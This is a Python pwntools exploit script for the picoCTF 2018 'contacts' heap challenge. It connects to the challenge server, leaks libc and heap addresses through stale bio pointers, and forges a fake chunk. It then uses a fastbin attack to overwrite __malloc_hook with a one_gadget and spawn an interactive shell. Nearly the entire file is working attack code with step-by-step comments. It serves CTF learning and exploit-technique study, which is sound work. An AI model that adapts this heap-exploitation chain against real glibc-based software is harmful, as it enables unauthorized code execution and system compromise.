#! /usr/bin/python

from pwn import *
import sys

executable = './contacts'
remote_ip = '2018shell1.picoctf.com'
port = 59572

contacts_count = 0

def exploit(is_remote):
	global r, contacts_count
	
	if is_remote:
		r = remote(remote_ip, port)
		""" Identified the provided libc."""
		libc = ELF('/home/ubuntu/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
		one_gadget_offset = 0xf1147
		print 'remote'
	else:
		r = process(executable)
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		print 'local'
	
	
	contacts_addr = 0x6020C0
	puts_got_entry = 0x602020
	
	fake_header_name = p64(0x0101010101010108)*3 + p64(0x81)[:-1]
	""" Add a contact and set it's bio. The bio is later used as a forged header of a heap chunk."""
	add_contact(fake_header_name)
	set_bio(fake_header_name, p64(0) + p64(0x81)[:-1])
	""" Add a contact and set it's bio to pass the following check when we allocate our forged chunk.
		The constrainst: ```if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
							|| __builtin_expect (nextsize >= av->system_mem, 0))```."""
	add_contact('Y'*15)
	set_bio('Y'*15, (p64(0x81)*10)[:-1], 0x60)
	
	""" The following block does the following: 
			1. Create a new chunk with name the size of contact struct (0x10) and set its second qword to puts_got_entry.
			2. Set it's bio to a new chunk with the same size as the contact struct.
			3. Delete it. Free order is: name, bio, chunk
			4. Add a new chunk with name the size of the contact struct. new_chunk = previous_chunk, new_name = previous_bio.
			5. Add a new chunk. new_chunk = previous_name.
			6. The bio field is not zeroed so we will have the previous value stored in it as the current value."""
	first_leak_name = 'LeakLibc' + p64(puts_got_entry)[:-1] 
	add_contact(first_leak_name)
	set_bio(first_leak_name, '\x00'*15)
	del_contact(first_leak_name)
	add_contact('B'*15)
	add_contact('C'*15)
	
	""" Print the details of our contacts. The last contact we added will have its bio point to put_got_entry - libc address leak."""
	output = display().split('\n')[contacts_count - 1]
	leaked_puts_address = (output[output.find('- ') + len('- '):].rstrip('\n')).encode('hex')
	print leaked_puts_address
	leaked_puts_address = int(''.join([leaked_puts_address[x: x + 2] for x in range(0, len(leaked_puts_address), 2)][::-1][:6]), 16)
	
	""" Calculate the addresses in libc that are relevant for us."""
	libc_base = leaked_puts_address - libc.symbols['puts']
	__malloc_hook_address = libc_base + libc.symbols['__malloc_hook']
	one_gadget = libc_base + one_gadget_offset
	print '-'*75
	print 'Leaked puts address:', hex(leaked_puts_address)
	print 'Libc base:', hex(libc_base)
	print '__malloc_hook:', hex(__malloc_hook_address)
	print 'One gadget:', hex(one_gadget)
	print '-'*75
	
	""" Same as first leak. This time we are leaking an address in the heap."""
	second_leak_name = 'LeakHeap' + p64(contacts_addr)[:-1]
	add_contact(second_leak_name)
	set_bio(second_leak_name, '\x00'*15)
	del_contact(second_leak_name)
	add_contact('D'*15)
	add_contact('E'*15)
	
	""" Print the details of our contacts. The last contact we added will have its bio point to the contacts array - heap address leak."""
	output = display().split('\n')[contacts_count - 1]
	print output
	leaked_heap_address = (output[output.find('- ') + len('- '):].rstrip('\n')).encode('hex')
	leaked_heap_address = int(''.join([leaked_heap_address[x: x + 2] for x in range(0, len(leaked_heap_address), 2)][::-1][:6]), 16)
	
	""" Used a debugger locally to find the distance between the first block (the one we are leaking) and our forged chunk."""
	target_heap_addr = leaked_heap_address + (0x2b0 - 0x250)
	print '-'*75
	print 'Leaked heap address:', hex(leaked_heap_address)
	print 'Target:', hex(target_heap_addr)
	print '-'*75
	
	""" Same idea as the previous leaks. This time instead of a leak we are inserting an address we want to free (and later on get it back
		from malloc)."""
	my_heap_chunk = 'FakeChnk' + p64(target_heap_addr)[:-1]
	add_contact(my_heap_chunk)
	set_bio(my_heap_chunk, '\x00'*15)
	del_contact(my_heap_chunk)
	add_contact('G'*15)
	add_contact('H'*15)
	
	add_contact('I'*15) # This contact is allocated so we can later on set it's bio with our payload.

	""" By deleting this contact we free our fake heap chunk and can get it back by allocationg a 0x70 sized chunk (the header we gave it
		stated a size of 0x81 which is 0x70 + header size (0x10) and prev_in_use bit on)."""
	del_contact('H'*15)
	
	""" After deleting this contact we have a chunk with the size of 0x70 (allocation of 0x60) in it's fastbin.
		We can overwrite its "next" pointer using our forged heap chunk to get back a pointer to a memory of our choosing (as long as its
		header fits the current fastbin)."""
	del_contact('Y'*15)
	
	""" Using a debugger again to find the correct padding we need. We don't want to change any other header so we overwrite them with their 
		previous values. Overwrite the free chunk's "next" pointer to __malloc_hook-0x23 - A useful chunk for fastbin attack due to the size 
		it has(0x7f) and the ability it grants in controlling the code flow upon a malloc invokation."""
	fake_bio =  p64(0) + p64(0x21) + '\x00'*0x10 + p64(0) + p64(0x21) + '\x00'*0x10 + p64(0) + p64(0x71) + p64(__malloc_hook_address  - 0x23)
	set_bio('G'*15, fake_bio, 0x70)
	
	""" Allocate a chunk with the size 0x60 - We will get back the pointer we freed while removing "'Y'*15". Will also put __malloc_hook-0x23 
		as the next size in this bin."""
	set_bio('D'*15, 'a', 0x60)
	target_address = one_gadget
	
	""" Pad the bytes between our chunk and __malloc_hook. Overwrite __malloc_hook with a one_gadget we can satisfy."""
	payload = 'Z'*0x13 + p64(target_address)
	set_bio('I'*15, payload, 0x60)
	
	""" Invoke malloc and get a shell."""
	r.sendline('create a')
	r.interactive()

def menu():
	global r
	
	r.recvuntil('> ')
	
	
def add_contact(name):
	global r, contacts_count
	
	menu()
	print 'Adding', name
	r.sendline('create ' + name)
	r.recvuntil('Created')
	r.recvuntil('\n')
	contacts_count += 1

	
def del_contact(name):
	global r, contacts_count
	
	menu()
	print 'Removing', name
	r.sendline('delete ' + name)
	r.recvuntil('Deleted')
	r.recvuntil('\n')
	contacts_count -= 1

	
def set_bio(name, bio, length=0):
	global r
	
	menu()
	print 'Seting {}`s bio to {}'.format(name, bio)
	r.sendline('bio ' + name)
	""" The length send to the program is the len of the bio provided as argument unless stated otherwise."""
	bio_length = str(length if length != 0 else len(bio))
	""" fgets is called with the size 4. If we send a 3-digits number and a '\n' we will overflow the '\n' into the next input."""
	if len(bio_length) == 3:
		r.sendafter('be?\n', bio_length)
	else:
		r.sendlineafter('be?\n', bio_length)
	r.sendlineafter('bio:\n', bio)
	r.recvuntil('\n')
	

def display():
	global r
	
	menu()
	r.sendline('display')
	return r.recvuntil('\nEnter')[:-len('\nEnter')]
	
	
if __name__ == '__main__':
	is_remote = True
	if len(sys.argv) > 1:
		if sys.argv[1] in ['-d', '-D']:
			is_remote = False
	exploit(is_remote)